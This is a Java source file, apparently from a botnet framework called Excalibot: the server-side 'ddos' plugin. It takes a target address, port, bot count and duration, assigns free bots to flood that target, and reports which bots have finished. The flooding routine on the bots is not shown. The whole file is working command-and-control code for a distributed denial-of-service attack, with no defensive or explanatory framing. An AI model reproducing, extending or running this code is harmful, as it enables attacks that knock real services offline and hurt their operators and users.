package org.powertrip.excalibot.common.plugins.ddos;

import org.powertrip.excalibot.common.com.*;
import org.powertrip.excalibot.common.plugins.ArthurPlug;
import org.powertrip.excalibot.common.plugins.interfaces.arthur.KnightManagerInterface;
import org.powertrip.excalibot.common.plugins.interfaces.arthur.TaskManagerInterface;
import org.powertrip.excalibot.common.utils.logging.Logger;

import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;


public class Server extends ArthurPlug{
	public Server(KnightManagerInterface knightManager, TaskManagerInterface taskManager) {
		super(knightManager, taskManager);
	}

	@Override
	public PluginHelp help() {
		return new PluginHelp().setHelp("Usage: ddos address:<address> port:<port_number> number_bots:<number of bots> time:<number_seconds>");
	}


	@Override
	public TaskResult check(Task task) {
		TaskResult result = new TaskResult();

		Long total = taskManager.getKnightCount(task.getTaskId());
		Long recev = taskManager.getResultCount(task.getTaskId());

		result
				.setSuccessful(true)
				.setTaskId(task.getTaskId())
				.setResponse("total", total.toString())
				.setResponse("done", recev.toString())
				.setComplete(total.equals(recev));
		return result;
	}

	@Override
	public TaskResult get(Task task) {
		Long total = taskManager.getKnightCount(task.getTaskId());
		Long recev = taskManager.getResultCount(task.getTaskId());

		TaskResult result = new TaskResult()
				.setTaskId(task.getTaskId())
				.setSuccessful(true)
				.setComplete(total.equals(recev));

		List<String> results = taskManager.getAllResults(task.getTaskId())
				.stream()
				.filter(str -> str.getResponseMap().containsKey("finished"))
				.map(str -> str.getResponse("finished"))
				.collect(Collectors.toList());

		return result.setResponse("stdout", "FinishedBots: " +
				String.join(", ",
						results.stream()
								.map(Integer::parseInt)
								.sorted()
								.map(String::valueOf)
								.collect(Collectors.toList())
				)
		);
	}

	@Override
	public void handleSubTaskResult(Task task, SubTaskResult subTaskResult) {
		/**
		 * Only if I need to do anything when I get a reply.
		 */
	}

	@Override
	public TaskResult submit(Task task) {
		//Get my parameter map, could use task.getParameter(String key), but this is shorter.
		Logger.log(task.toString());
		Map args = task.getParametersMap();

		//Declare my parameters
		String address;
		int numberBots;
		int port;
		int time;

		//Create a TaskResult and fill the common fields.
		TaskResult result = new TaskResult()
				.setTaskId(task.getTaskId())
				.setSuccessful(false)
				.setComplete(true);

		//No Dice! Wrong parameters.
		if( !args.containsKey("address") || !args.containsKey("port") || !args.containsKey("number_bots") || !args.containsKey("time")) {
			return result.setResponse("stdout", "Wrong parameters");
		}

		//Parse parameters
		address = (String) args.get("address");
		port = Integer.parseInt((String)args.get("port"));
		numberBots = Integer.parseInt((String) args.get("number_bots"));
		time = Integer.parseInt((String) args.get("time"));

		try {
			//Get bots alive in the last 50 seconds and get as many as needed
			List<KnightInfo> bots = knightManager.getFreeKnightList(50000).subList(0, numberBots);


			for(KnightInfo bot : bots){

				knightManager.dispatchToKnight(
						new SubTask(task, bot)
								.setParameter("address", address)
								.setParameter("port", String.valueOf(port))
								.setParameter("time", String.valueOf(time))
								.setParameter("botId" , String.valueOf(bot.getId()))
				);
			}
			result
					.setSuccessful(true)
					.setResponse("stdout", "Task accepted, keep an eye out for the results :D");
		}catch (IndexOutOfBoundsException e) {
			//No bots...
			result.setResponse("stdout", "Not enough free bots.");
		}
		return result;
	}

}
